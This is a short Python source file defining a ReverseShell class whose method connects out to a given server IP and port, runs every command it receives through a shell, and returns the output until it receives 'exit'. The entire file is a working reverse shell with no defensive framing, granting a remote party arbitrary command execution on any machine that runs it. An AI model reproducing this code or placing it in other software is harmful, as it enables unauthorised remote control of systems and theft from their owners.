import socket
import subprocess

class ReverseShell:
    def __init__(self):
        pass

    def start_reverse_shell(self, server_ip, server_port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((server_ip, server_port))
        while True:
            command = sock.recv(1024).decode('utf-8')
            if command == 'exit':
                sock.close()
                break
            output = subprocess.run(command, shell=True, capture_output=True)
            sock.send(output.stdout + output.stderr)
